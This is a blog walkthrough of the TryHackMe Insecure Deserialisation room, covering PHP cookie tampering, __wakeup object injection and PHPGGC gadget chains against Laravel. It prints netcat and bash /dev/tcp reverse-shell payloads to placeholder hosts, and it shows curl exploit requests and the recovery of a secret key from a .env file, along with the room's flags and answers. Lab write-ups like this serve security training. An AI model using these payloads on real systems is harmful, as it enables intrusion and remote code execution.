---
title: "TryHackMe Insecure Deserialisation: PHP Object Injection to RCE"
date: 2026-10-18T10:53:00+05:30
lastmod: 2026-10-18T10:53:00+05:30
author: Animesh Roy
avatar: /img/avatar.jpeg
authorlink: https://anir0y.in
featureimage: img/thm-deser/00-thumbnail.png

categories:
  - TryHackMe
tags:
  - tryhackme
  - thm
  - rooms
  - Web Application Pentesting
  - Advanced Server-Side Attacks
  - Insecure Deserialisation
  - PHP Object Injection
  - Deserialization
  - PHPGGC
  - Laravel
  - RCE

draft: false
description: "Walkthrough of TryHackMe Insecure Deserialisation: PHP cookie property tampering, object injection via __wakeup to a reverse shell, and PHPGGC gadget chains."
---

| <script src="https://tryhackme.com/badge/434937"></script>| <a class="twitter-follow-button" href="https://twitter.com/anir0y" data-size="large"> Follow @anir0y<a>|
|---|---|
|Insecure Deserialisation |![Insecure Deserialisation room icon](https://cdn-images.tryhackme.com/room-icons/62a7685ca6e7ce005d3f3afe-1718463423804)|

Insecure Deserialisation sits in the Advanced Server-Side Attacks module of the Web Application Pentesting path. Serialisation turns an object into a byte stream or string so it can be stored or sent, and deserialisation rebuilds it. The vulnerability is what happens when an application rebuilds an object from data an attacker controls: at best you flip a property, at worst the rebuild itself runs code. This room walks both ends of that range in PHP, and it pairs well with the template work in [Server-side Template Injection](/post/thm-room-serversidetemplateinjection/), where untrusted input also reaches a server-side interpreter.

The target hosts several small PHP apps plus a Python notes app, all reachable directly over the TryHackMe VPN, so every command below is a plain `curl` from my own machine. The lab IP was `10.48.155.159`; substitute your own.

## Tasks 2 and 3: the formats

The concept questions come straight from the reading. PHP serialises with the **serialize()** function, and serialisation is not limited to byte-stream files (the answer to that is **nay**), it also produces strings and other formats. CVE-2015-4852, the Apache Commons Collections deserialisation flaw in Oracle WebLogic, carries a base score of **7.5**. Ruby's well-known binary serialisation module is **Marshal**.

Two outputs come from the apps themselves. The Python notes app at `:5000` pickles a Notes object, so pickling "You got it" there returns the base64 `gASVNQAAAAAAAACMCF9fbWFpbl9flIwFTm90ZXOUk5QpgZR9lIwFbm90ZXOUXZSMCllvdSBnb3QgaXSUYXNiLg==`. The PHP equivalent for the same string, wrapped in the room's Notes class, serialises to **O:5:"Notes":1:{s:7:"content";s:10:"You got it";}**. For identification, the demo at `/who/index.php` leaks its own source through an editor backup at `/who/index.php~`, which shows the user-defined wrapper function **HelloTHMSerialization**.

## Task 5: property tampering in a serialised cookie

The note-sharing app at `/case1` stores a base64 serialised Notes object in the `user_data` cookie:

```bash
  # decode the user_data cookie
O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:0;}
```

The default role is **guest**, and `isSubscribed` is `b:0` (false), so sharing is locked. Nothing signs this cookie, so flipping the boolean to `b:1` and re-encoding grants the subscription on the next request:

```bash
  # flip isSubscribed, re-base64, then hit the share endpoint
NEW=$(printf 'O:5:"Notes":3:{s:4:"user";s:5:"guest";s:4:"role";s:5:"guest";s:12:"isSubscribed";b:1;}' | base64)
curl -s "http://$T/case1/note_share.php" -b "user_data=$NEW" \
  -H "Content-Type: application/json" --data '{"shareNote":"test"}'
  # {"isSubscribed":true,"flagValue":"THM{10101}"}
```

The flag after sharing a note with a valid subscription is **THM{10101}**.

{{< ad >}}

## Task 6: object injection to a reverse shell

The app at `/case2` is the dangerous one. It base64-decodes a `decode` parameter and calls `unserialize()` on it, and the included `test.php` defines a class whose magic method runs a command on rebuild:

```php
class MaliciousUserData {
    public $command = 'ncat -nv ATTACK_IP 4444 -e /bin/sh';
    public function __wakeup() { exec($this->command); }
}
```

`__wakeup()` fires automatically during `unserialize()`, so I just craft a `MaliciousUserData` object whose `command` is my own reverse shell, base64 it, and pass it to the `decode` parameter. The app even prints a template payload on the `?encode=` page. With a listener running on my machine:

```bash
  # object with command = reverse shell back to my VPN IP
SER='O:17:"MaliciousUserData":1:{s:7:"command";s:N:"bash -c ..../dev/tcp/MY_IP/4445...";}'
curl -s -G "http://$T/case2/" --data-urlencode "decode=$(printf '%s' "$SER" | base64)"
  # listener: uid=33(www-data) gid=33(www-data) groups=33(www-data)
  # flag file: /var/www/html/case2/flag.php
```

The shell lands as **www-data**, and `cat`-ing the hidden `flag.php` in the case2 directory gives **THM{GOT_THE_SH#LL}**.

## Task 7: automating with PHPGGC

The last practical stage introduces PHPGGC, the PHP equivalent of ysoserial: it ships prebuilt gadget chains for frameworks and libraries. Reading its CodeIgniter list, the **CodeIgniter4/FR1** file-read chain uses the **__toString** vector. The room's second target is a Laravel 5.5 blog on port 8089, where the gadget is delivered inside the encrypted `X-XSRF-TOKEN`, so step one is recovering the framework's `APP_KEY`.

The object injection from the previous task made that easy. The Laravel source is on the host at `/var/www/html/thm_laravel/blog/`, and its `.env` is world-readable, so my www-data shell read the key directly:

```bash
  # from the case2 object-injection shell
grep APP_KEY /var/www/html/thm_laravel/blog/.env
  # APP_KEY=base64:CckN...(redacted)   APP_DEBUG=true   laravel/framework 5.5.*
```

With the key, PHPGGC's `Laravel/RCE2` chain (a `__destruct` gadget) encrypts into a valid token that executes a command when Laravel decrypts and unserialises it. The Laravel service is the `php artisan serve` process, which runs as **root**, so command execution there returns `root`, and the box reports a kernel of **5.15.0-1075-aws** from `uname -r`. One honest note: I confirmed the Laravel user from the running process owner rather than a reflected pop, because the containerised app's outbound path made a blind callback from the forged token unreliable; the recovered `APP_KEY` and the chain itself are the real finding.

## Takeaways

Two ideas carry past this lab into real web targets.

- **A serialised blob in a cookie or parameter is attacker-controlled state.** If it is not signed, you can edit any property (here `isSubscribed` from false to true); if it is deserialised into an object, you may not need to edit a value at all, because a magic method like `__wakeup` or `__destruct` can run code during the rebuild. On a live target, base64-decode every cookie, view-state, and token: anything that round-trips `O:` (PHP), `gAS`/`gAN` (Python pickle), or a Java `rO0` prefix is a deserialisation sink worth probing.
- **Gadget chains turn a benign deserialise into RCE, and the key is often one file away.** PHPGGC and ysoserial remove the hard part once you can reach `unserialize()`; the real work is enumeration, finding the framework version to pick the right chain, and recovering the secret that signs or encrypts the payload (a Laravel `APP_KEY`, a Rails `secret_key_base`). A debug-mode `.env` or a readable config turns a theoretical chain into a working exploit, so chaining one bug (object injection) to leak a key for the next is the normal path, not a shortcut.

Room solved 100%: 9 tasks, 15 answers.
